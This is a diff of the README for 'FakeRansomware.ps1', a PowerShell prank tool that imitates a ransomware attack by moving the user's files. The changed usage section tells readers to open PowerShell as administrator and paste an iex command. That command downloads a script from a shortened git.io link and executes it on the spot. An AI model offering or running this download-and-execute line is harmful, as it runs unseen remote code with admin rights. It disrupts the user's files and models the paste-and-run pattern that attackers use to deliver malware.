@@ -9,5 +9,7 @@ It will look like a ransomware attack, but basically it will just move your file
 
 <h2>How to use it:</h2>
 Download FakeRansomware.ps1 to your desktop<br>
-Open powershell AS ADMINISTRATOR and run this full command:<br>
+open powershell <b>AS ADMIN</b> and run:
+```
 iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JSS0v'))
+```
